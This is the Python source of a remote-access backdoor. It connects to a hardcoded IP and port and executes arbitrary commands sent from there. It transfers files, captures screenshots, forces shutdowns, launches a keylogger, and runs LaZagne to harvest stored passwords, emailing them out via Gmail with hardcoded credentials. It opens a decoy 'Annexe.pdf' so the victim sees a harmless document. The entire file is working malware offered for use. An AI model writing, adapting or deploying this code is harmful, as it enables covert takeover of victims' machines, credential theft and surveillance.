#!/usr/bin/python2.7

import socket
import subprocess
import json
import os
import base64
import sys
from PIL import ImageGrab
import time
import ctypes
import keylogger as Ky
import pyfiglet
import requests
import smtplib
import tempfile
class Backdoor:

	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect(("192.168.31.128",4444))

	def reliable_send(self,data):
		json_data = json.dumps(data, encoding = 'latin1')
		self.connection.send(json_data)
		
        def send_mail(self,email,password,message):
                server = smtplib.SMTP("smtp.gmail.com",587)
                server.starttls()
                server.login(email,password)
                server.sendmail(email,email,message)
                server.quit()
                
        def lazagne(self,option):
                DEVNULL = open(os.devnull, 'wb')
                chemain = "lazagne.exe "+option
                result = subprocess.check_output(chemain,shell=True,stderr=DEVNULL,stdin=DEVNULL)
                self.send_mail("keyloggerreports0@gmail.com","bdsas1234",result)
                os.remove("lazagne.exe")
                return "[+] Lazagne is being executed .\nCheck keyloggerreports0@gmail.com for reports"
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue


	def execute_system_commmand(self,command):
                DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command,shell=True, stderr=DEVNULL,stdin=DEVNULL)


	# take a screenshot
	def screenshot(self):
		img = ImageGrab.grab()
		filename = os.path.join(time.strftime('img_%S') + '.png')
		img.save(filename)
		return "[+] Screenshot saved as: " + filename
	
	def change_working_directory_to(self,path):
		os.chdir(path)
		return "[+] Change working directory to " + path

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def shutdown(self,shutdowntype):
	    command = "shutdown {0} -f -t 30".format(shutdowntype)
	    subprocess.Popen(command.split(), shell=True)
	    #objSocket.close()  # close connection and exit
	    sys.exit(0)
	    return "[+] powering off ..."


	def MessageBox(self,contant,head):
	    ctypes.windll.user32.MessageBoxW(0, head, contant, 0)
	    return "[+] message "+ contant +" is sended"

	def launch_keylogger(self,mail,password):
		my_keylogger = Ky.Keylogger(20,mail,password)
		my_keylogger.start()
		return "[+] keylogger is being executed .\nCheck " +mail+ " for reports"

	def run(self):
		while True:
			command = self.reliable_receive()

			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1],command[2])
				elif command[0] == "screenshot":
					command_result = self.screenshot()
				elif command[0] == "shutdown":
					command_result = self.shutdown(command[1])
				elif command[0] == "message":
					command_result = self.MessageBox(command[1],command[2])
				elif command[0] == "keylogger":
					command_result = self.launch_keylogger(command[1],command[2])
				elif command[0] == "get_passwords":
                                        command_result = self.lazagne(command[1])
				else:
					command_result = self.execute_system_commmand(command)


			except Exception:
				command_result = "[-] Error during command Execution"
                                
                        self.reliable_send(command_result)
			


try: 
        file_name = sys._MEIPASS+"\Annexe.pdf"  
except Exception:
        file_name = os.path.abspath(".")+"\Annexe.pdf"
         
subprocess.Popen(file_name, shell = True)
my_backdoor = Backdoor("192.168.31.128",4444)
my_backdoor.run()

